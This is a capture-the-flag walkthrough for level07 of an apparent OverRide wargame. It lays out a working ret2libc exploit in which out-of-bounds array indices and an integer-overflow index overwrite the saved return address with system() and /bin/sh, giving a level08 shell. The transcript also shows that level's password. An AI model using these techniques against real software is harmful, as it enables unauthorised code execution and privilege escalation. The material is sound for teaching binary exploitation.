# level07 walkthrough

## the binary
``` shell
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 42
 Index: 42
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command: store
 Number: 42
 Index: 1
 Completed store command successfully
Input command: store
 Number: 42
 Index: 0
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command: read
 Index: 0
 Number at data[0] is 0
 Completed read command successfully
Input command: read
 Index: 42
 Number at data[42] is 0
 Completed read command successfully
 Input command: read
 Index: 1
 Number at data[1] is 42
 Completed read command successfully
```

## methodology
- ret2libc attack

As we observed the behavior of the binary with various inputs and examined the disassembled code, we realized several things:

- the main functionality involves storing and reading numbers from an array
- the array has 100 active number positions
- there are no limits on indices, so we can access stack memory
- some positions are protected (zero + indices divisible by 3)
- the `env` and `argv` are overwritten before the storage is run (= no shellcode)

We start by printing stack variables stored in indices greater than 100:
``` shell
level07@OverRide:/$ bash /tmp/print_stack.sh
tab[100]: 0x1
tab[101]: 0x64616572
tab[102]: 0x0
tab[103]: 0x0
tab[104]: 0x0
tab[105]: 0x0
tab[106]: 0xd18b1b00
tab[107]: 0xf7feb620
tab[108]: 0x0
tab[109]: 0x8048a09
tab[110]: 0xf7fceff4
tab[111]: 0x0
tab[112]: 0x0
tab[113]: 0x0
tab[114]: 0xf7e45513
tab[115]: 0x1
tab[116]: 0xffffd6c4
tab[117]: 0xffffd6cc
tab[118]: 0xf7fd3000
tab[119]: 0x0
tab[120]: 0xffffd61c
tab[121]: 0xffffd6cc
tab[122]: 0x0
tab[123]: 0x80482b8
tab[124]: 0xf7fceff4
tab[125]: 0x0
```

The `EIP` register is located at position 114, which is unfortunately reserved for wil. Since the `EIP` register tells the CPU where to execute the next instruction, gaining control of it is crucial. To access this position, we use integer overflow:
``` vbnet
UINT_MAX = 4294967295 (+ 1 for overflow)

4294967296 / 4 (int) + 114 = 1073741938

└─> accessing position 1073741938 allows us to store/read to confirm we operate on 114
```

Having access to `EIP` means we can perform a ret2libc attack. We only need to find the addresses of `system` and `/bin/sh`, as `exit` can be executed by the binary itself. Lets convert these addresses to decimal for storage in the array:
``` vbnet
(gdb) p &system
$1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
└─> decimal: 4159090384

(gdb) find &system, +999999999, "/bin/sh"
0xf7f897ec
└─> decimal: 4160264172
```

As we tested multiple positions, we found that the functional position for `/bin/sh` is 116. Therefore, upon execution of the binary, we need to make the following changes:
``` vbnet
position 114 = system address
└─> tab[1073741938] = 4159090384

position 116 = /bin/sh address
└─> tab[116] = 4160264172

quit command = exit address
```

## flag
``` shell
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
